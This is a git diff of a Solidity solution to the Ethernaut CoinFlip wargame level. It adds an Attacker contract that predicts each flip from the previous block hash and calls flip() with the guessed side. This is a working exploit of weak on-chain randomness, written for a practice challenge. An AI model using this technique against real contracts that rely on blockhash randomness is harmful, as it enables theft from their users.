@@ -6,7 +6,6 @@ contract CoinFlip {
   uint256 public consecutiveWins;
   uint256 lastHash;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-  address ethernautContract = 0xb7D0e195732ab970cD3E9aECB0eB6fA86bF49371;
 
   constructor() {
     consecutiveWins = 0;
@@ -31,19 +30,24 @@ contract CoinFlip {
       return false;
     }
   }
+}
 
-  function calculateCoinFlip() public view returns(bool){
-    uint256 blockValue = uint256(blockhash(block.number - 1));
 
-    uint256 coinFlip = blockValue / FACTOR;
-    return coinFlip == 1 ? true : false;
-  }
+contract Attacker {
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip public con;
 
-  function alwaysRightFunction() public{
-    bytes memory func= abi.encodeWithSignature("flip(bool)", calculateCoinFlip());
-    (bool success ,) = ethernautContract.call(func);
+    constructor(address flipCoinAddress){
+        con = CoinFlip(flipCoinAddress);
+    }
 
-    if(!success) revert("No success contacting the contract");
-  }
+    function attack() public{
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+         uint256 coinFlip = blockValue / FACTOR;
+         bool side = coinFlip == 1 ? true : false;
+
+        con.flip(side);
+    }
 
 }
